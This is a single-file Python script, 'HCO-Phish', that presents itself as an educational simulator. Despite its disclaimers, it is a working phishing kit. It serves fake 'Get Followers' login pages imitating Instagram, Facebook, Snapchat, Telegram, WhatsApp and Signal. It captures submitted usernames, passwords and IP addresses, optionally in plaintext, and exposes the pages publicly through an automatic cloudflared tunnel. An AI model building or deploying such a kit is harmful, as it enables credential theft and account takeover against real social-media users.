#!/usr/bin/env python3
"""
HCO-Phish.py — Single-file Educational Simulator (safe)

Features:
- Colorful lock screen with countdown and YouTube redirect.
- Bold ASCII banner "HCO-Phish by Azhar" (red text on blue background in Termux when colorama available).
- Terminal menu (1..6) for Instagram, Facebook, Snapchat, Telegram, WhatsApp, Signal.
- Starts local Flask server serving 6 simulation pages with icons and follower choices (100, 1,000, 10,000).
- Best-effort auto-start of cloudflared and extraction of public trycloudflare URL for sharing to a second device.
- Subtle footer on pages: "Educational simulation — do not enter real credentials."
- Logs submitted username and either plaintext or SHA256 hash (depending on runtime confirmation) to simulation_log.txt and prints to console.
- Single-file, ready to upload to GitHub.

SAFETY: Use only on your own devices/accounts or with explicit permission. Do not use for illicit activity.
"""
import os
import sys
import time
import re
import hashlib
import subprocess
import threading
import webbrowser
from datetime import datetime
from shutil import which

# --- Dependencies check ---
try:
    from flask import Flask, render_template_string, request
except Exception:
    print("Missing Flask. Install with: pip install Flask")
    sys.exit(1)

try:
    from colorama import init as colorama_init, Fore, Back, Style
    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except Exception:
    HAS_COLORAMA = False
    class _C: pass
    Fore = Back = Style = _C()
    Fore.RED = Fore.GREEN = Fore.YELLOW = Fore.CYAN = Fore.WHITE = ""
    Back.BLUE = ""
    Style.RESET_ALL = ""

# ---------------- Config ----------------
APP_HOST = "127.0.0.1"
APP_PORT = 5000
YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
CLOUDFLARED_BIN = "cloudflared"   # must be in PATH to auto-start
CLOUDFLARED_TIMEOUT = 25          # seconds to wait for trycloudflare link
LOGFILE = "simulation_log.txt"
TEMPLATE_KEYS = ["instagram", "facebook", "snapchat", "telegram", "whatsapp", "signal"]
ICON_MAP = {
    "instagram": "📷",
    "facebook":  "📘",
    "snapchat":  "👻",
    "telegram":  "✈️",
    "whatsapp":  "💬",
    "signal":    "🔵"
}
# ----------------------------------------

# Embedded HTML templates (render_template_string)
INDEX_HTML = """
<!doctype html>
<html>
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HCO-Phish Simulator</title>
<style>
body{font-family:Inter, system-ui, Arial, sans-serif; background:#f3f6fb; margin:0; color:#111}
.container{max-width:840px;margin:40px auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 12px 40px rgba(10,20,40,0.06);text-align:center}
.grid{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:16px}
.card{min-width:160px;padding:14px;border-radius:10px;background:#0b84ff;color:#fff;text-decoration:none;font-weight:700;display:inline-flex;align-items:center;gap:8px;justify-content:center}
.note{color:#666;margin-top:14px;font-size:13px}
.footer{font-size:12px;color:#999;margin-top:18px}
</style>
</head>
<body>
  <div class="container">
    <h1>HCO-Phish — Educational Simulator</h1>
    <p class="note">Choose a platform to preview the simulated "Get Followers" page.</p>
    <div class="grid">
      {% for key,label,icon in items %}
        <a class="card" href="/simulate/{{key}}">{{icon}} &nbsp; {{label}}</a>
      {% endfor %}
    </div>
    <div class="footer">This is a controlled educational simulation — do not enter real account credentials.</div>
  </div>
</body>
</html>
"""

FORM_HTML = """
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{label}} — Get Followers</title>
<style>
:root{--accent:#0b84ff;--muted:#666}
body{font-family:Inter, system-ui, Arial, sans-serif;background:#eef2f7;margin:0;color:#111}
.wrap{max-width:420px;margin:36px auto;padding:18px;background:white;border-radius:12px;box-shadow:0 10px 30px rgba(10,20,40,0.06)}
.header{display:flex;align-items:center;gap:12px;padding-bottom:8px;border-bottom:1px solid #f0f0f0}
.icon{font-size:44px}
.title{font-size:18px;font-weight:700}
.subtitle{color:var(--muted);font-size:13px}
.form{padding-top:12px}
label{display:block;font-size:13px;margin-top:8px;color:#333}
select,input{width:100%;padding:10px;margin-top:6px;border-radius:8px;border:1px solid #ddd;box-sizing:border-box}
.btn{width:100%;padding:12px;border-radius:8px;border:none;background:var(--accent);color:white;font-weight:700;margin-top:12px}
.foot{font-size:12px;color:#999;margin-top:12px;text-align:center}
</style>
</head>
<body>
  <div class="wrap">
    <div class="header">
      <div class="icon">{{icon}}</div>
      <div>
        <div class="title">{{label}}</div>
        <div class="subtitle">Simulated "Get Followers" demo</div>
      </div>
    </div>
    <div class="form">
      <form action="/submit" method="post">
        <input type="hidden" name="template" value="{{label}}">
        <label>Select followers package</label>
        <select name="followers">
          <option value="100">100</option>
          <option value="1000">1,000</option>
          <option value="10000">10,000</option>
        </select>
        <label>Username</label>
        <input name="username" placeholder="username" required>
        <label>Password</label>
        <input type="password" name="password" placeholder="password" required>
        <button class="btn" type="submit">Get Followers</button>
      </form>
    </div>
    <div class="foot">Educational simulation — do not enter real account credentials.</div>
  </div>
</body>
</html>
"""

DONE_HTML = """
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Submitted</title>
<style>body{font-family:Inter,system-ui,Arial;background:#0b1724;color:white;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:#b71c34;padding:22px;border-radius:10px;text-align:center}a{color:#fff}</style></head>
<body><div class="box"><h1>Submission recorded</h1><p>Thank you — this submission is stored in the simulation log for demonstration.</p><p><a href="/">Return</a></p></div></body></html>
"""

# ---------------- Flask app ----------------
from flask import Flask, render_template_string, request
app = Flask(__name__)

def init_log():
    if not os.path.exists(LOGFILE):
        with open(LOGFILE, "w", encoding="utf-8") as f:
            f.write("*** SIMULATION ONLY - DO NOT USE REAL CREDENTIALS ***\n")
            f.write(f"Created: {datetime.utcnow().isoformat()} UTC\n\n")

def log_plain(template, followers, username, password, ip):
    init_log()
    ts = datetime.utcnow().isoformat()
    entry = f"[{ts}] {template} | followers={followers} | user={username} | pass={password} | ip={ip}\n"
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(entry)
    print(f"{Fore.YELLOW}[CAPTURED]{Style.RESET_ALL} {entry.strip()}")

def log_hashed(template, followers, username, password, ip):
    init_log()
    ts = datetime.utcnow().isoformat()
    ph = hashlib.sha256(password.encode("utf-8")).hexdigest()
    entry = f"[{ts}] {template} | followers={followers} | user={username} | pass_sha256={ph} | ip={ip}\n"
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(entry)
    print(f"{Fore.CYAN}[LOGGED]{Style.RESET_ALL} {ts} | {template} | {username} | {ph[:12]}...")

@app.route("/")
def index():
    items = []
    for k in TEMPLATE_KEYS:
        items.append((k, k.capitalize(), ICON_MAP.get(k, "🔰")))
    return render_template_string(INDEX_HTML, items=items)

@app.route("/simulate/<name>")
def simulate(name):
    name_l = str(name).lower()
    if name_l not in TEMPLATE_KEYS:
        return "Not found", 404
    icon = ICON_MAP.get(name_l, "🔰")
    label = name_l.capitalize()
    return render_template_string(FORM_HTML, label=label, icon=icon)

@app.route("/submit", methods=["POST"])
def submit():
    tpl = request.form.get("template", "Unknown")
    followers = request.form.get("followers", "N/A")
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = request.remote_addr
    if STORE_PLAINTEXT:
        log_plain(tpl, followers, username, password, ip)
    else:
        log_hashed(tpl, followers, username, password, ip)
    return render_template_string(DONE_HTML)

# ---------------- Cloudflared helper ----------------
def start_cloudflared_and_get_url(host=APP_HOST, port=APP_PORT, timeout=CLOUDFLARED_TIMEOUT):
    if not which(CLOUDFLARED_BIN):
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} '{CLOUDFLARED_BIN}' not found in PATH. Install cloudflared to enable public tunnel.")
        return None, None
    cmd = [CLOUDFLARED_BIN, "tunnel", "--url", f"http://{host}:{port}", "--no-autoupdate"]
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Failed to start cloudflared: {e}")
        return None, None
    public_url = None
    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} cloudflared started — waiting up to {timeout}s for public URL...")
    start = time.time()
    buffer = ""
    # Read incrementally and print output to terminal
    while time.time() - start < timeout:
        if p.poll() is not None:
            break
        try:
            ch = p.stdout.read(1)
            if not ch:
                time.sleep(0.1)
                continue
            buffer += ch
            # flush any full lines for debug
            if "\n" in buffer:
                lines = buffer.splitlines(True)
                for ln in lines:
                    if ln.endswith("\n"):
                        print(f"{Fore.MAGENTA}[cloudflared]{Style.RESET_ALL} {ln.strip()}")
                buffer = ""
            # try to extract trycloudflare link from stdout
            # read a bit more to improve detection
            tail = (p.stdout.read(200) or "")
            text_chunk = ch + tail
            m = re.search(r"(https://[^\s'\"<>]*trycloudflare[^\s'\"<>]*)", text_chunk)
            if m:
                public_url = m.group(1)
                break
        except Exception:
            time.sleep(0.1)
    # final attempt to read bulk output
    if not public_url:
        try:
            rest = p.stdout.read()
            if rest:
                print(rest)
                m2 = re.search(r"(https://[^\s'\"<>]*trycloudflare[^\s'\"<>]*)", rest)
                if m2:
                    public_url = m2.group(1)
        except Exception:
            pass
    if public_url:
        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Detected public URL: {public_url}")
    else:
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Could not auto-detect trycloudflare link. Inspect cloudflared output above for the public URL.")
    return p, public_url

# ---------------- URL open helpers ----------------
def open_url_prefer_android(url):
    # try termux-open-url, am start, xdg-open, then webbrowser
    try:
        if which("termux-open-url"):
            subprocess.run(["termux-open-url", url], check=False)
            return True
    except Exception:
        pass
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
        return True
    except Exception:
        pass
    try:
        if which("xdg-open"):
            subprocess.run(["xdg-open", url], check=False)
            return True
    except Exception:
        pass
    try:
        webbrowser.open(url)
        return True
    except Exception:
        return False

# ---------------- Terminal UI ----------------
def colorful_countdown():
    for i in range(8, 0, -1):
        if HAS_COLORAMA:
            print(Fore.RED + f"Unlocking in {i}..." + Style.RESET_ALL)
        else:
            print(f"Unlocking in {i}...")
        time.sleep(1)

def print_banner():
    banner = "╔" + "═" * 30 + "╗\n" + "║" + " HCO-Phish by Azhar ".center(30) + "║\n" + "╚" + "═" * 30 + "╝"
    if HAS_COLORAMA:
        print(Back.BLUE + Fore.RED + banner + Style.RESET_ALL)
    else:
        print(banner)

def show_menu_and_get_choice():
    print("\n" + "=" * 48)
    print("MENU — choose a template (enter number):")
    for i, key in enumerate(TEMPLATE_KEYS, start=1):
        print(f"{i}) {ICON_MAP.get(key,'🔰')}  {key.capitalize()}")
    print("0) Exit")
    choice = input("Select (0-6): ").strip()
    if not choice.isdigit():
        print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
        return None
    c = int(choice)
    if c == 0:
        sys.exit(0)
    if 1 <= c <= len(TEMPLATE_KEYS):
        return TEMPLATE_KEYS[c - 1]
    else:
        print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
        return None

# ---------------- Main ----------------
STORE_PLAINTEXT = False

def main():
    global STORE_PLAINTEXT
    os.system("clear")
    print("=" * 60)
    print("HCO-Phish — Educational Simulator (single-file)")
    print("=" * 60)
    print("WARNING: This tool can capture inputs on the demo pages.")
    print("Only use test/dummy accounts and devices you own or have permission to test.")
    ans = input("Do you want submitted credentials to be shown and saved as PLAINTEXT? (y/N): ").strip().lower()
    if ans == "y":
        STORE_PLAINTEXT = True
        print(Fore.RED + "*** PLAINTEXT storage enabled. Use responsibly. ***" + Style.RESET_ALL)
    else:
        STORE_PLAINTEXT = False
        print("Credentials will be stored as SHA256 hashes (safer).")

    input("\nPress ENTER to unlock (this runs countdown and attempts to open your YouTube channel)...")
    colorful_countdown()
    print("\n[*] Attempting to open YouTube channel...")
    opened = open_url_prefer_android(YOUTUBE_LINK)
    if not opened:
        print(f"{Fore.YELLOW}[!] Could not open YouTube automatically. Please open this link manually: {YOUTUBE_LINK}{Style.RESET_ALL}")
    input("After returning from YouTube, press ENTER to continue...")

    os.system("clear")
    print_banner()

    # show menu
    selection = None
    while not selection:
        selection = show_menu_and_get_choice()
    print(f"\n[*] You selected: {selection.capitalize()}")

    # start Flask server
    print("\n[*] Starting local Flask server...")
    flask_thread = threading.Thread(target=lambda: app.run(host=APP_HOST, port=APP_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    time.sleep(1.0)

    # ask to auto-start cloudflared
    use_cf = input("Start cloudflared automatically if available to create a public HTTPS link? (y/N): ").strip().lower()
    cf_proc = None
    public_url = None
    if use_cf == "y":
        cf_proc, public_url = start_cloudflared_and_get_url()
    local_demo = f"http://{APP_HOST}:{APP_PORT}/simulate/{selection}"
    print("\n--- Access URLs ---")
    print("Local (LAN):", local_demo)
    if public_url:
        pub_full = public_url.rstrip("/") + f"/simulate/{selection}"
        print("Public (copy to your second device):", pub_full)
    else:
        if cf_proc:
            print(f"{Fore.YELLOW}[!] cloudflared started but public URL not auto-detected. Inspect cloudflared output above.{Style.RESET_ALL}")
            print("If cloudflared printed a trycloudflare URL, append '/simulate/<template>' and open it on your test device.")
        else:
            print(f"{Fore.YELLOW}[!] cloudflared not started. To expose publicly, install cloudflared and run in another Termux session:{Style.RESET_ALL}")
            print("    cloudflared tunnel --url http://127.0.0.1:5000")

    print("\nOpen the Local or Public URL on your test device to demo the page.")
    print("When the simulated form is submitted, the result will be shown in this Termux terminal and saved to", LOGFILE)
    print("Press Ctrl+C in this Termux session to stop the server and cloudflared when finished.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        if cf_proc:
            try:
                cf_proc.terminate()
            except Exception:
                pass
        sys.exit(0)

if __name__ == "__main__":
    main()
